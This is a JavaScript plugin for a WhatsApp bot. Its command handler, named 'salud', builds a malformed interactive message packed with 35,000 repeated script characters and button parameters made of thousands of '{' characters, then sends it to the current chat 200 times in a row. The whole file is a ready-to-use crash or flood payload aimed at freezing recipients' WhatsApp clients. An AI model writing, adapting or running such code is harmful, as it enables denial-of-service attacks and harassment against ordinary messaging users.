let handler = async (m, { conn }) => {
  const target = m.chat;
  const delay = (ms) => new Promise((res) => setTimeout(res, ms));

  await m.reply("😼 Procesando espere 5 minutos para volverlo a usar");

  async function ForceXsystem(kirana, target) {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 99999999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "༑⌁⃰Byzorroཀ‌‌🦠" + "ꦾ".repeat(35000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(15000),
              buttons: [
                { name: "single_select", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "call_permission_request", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "cta_url", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "cta_call", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "cta_copy", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "cta_reminder", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "cta_cancel_reminder", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "address_message", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "send_location", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "quick_reply", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "mpm", ParamsJson: "{".repeat(10000), version: 3 },
              ],
            },
          },
        },
      },
    };

    await kirana.relayMessage(target, message, {
      participant: { jid: target },
    });
  }

  // Enviar ForceXsystem 200 veces en 5 minutos
  for (let i = 0; i < 200; i++) {
    await ForceXsystem(conn, target);
    await delay(1500); // 1.5 segundos
  }

  await conn.reply(m.chat, "✅ Secuencia de 200 mensajes completada.", m);
};

handler.command = /^salud$/i;
export default handler;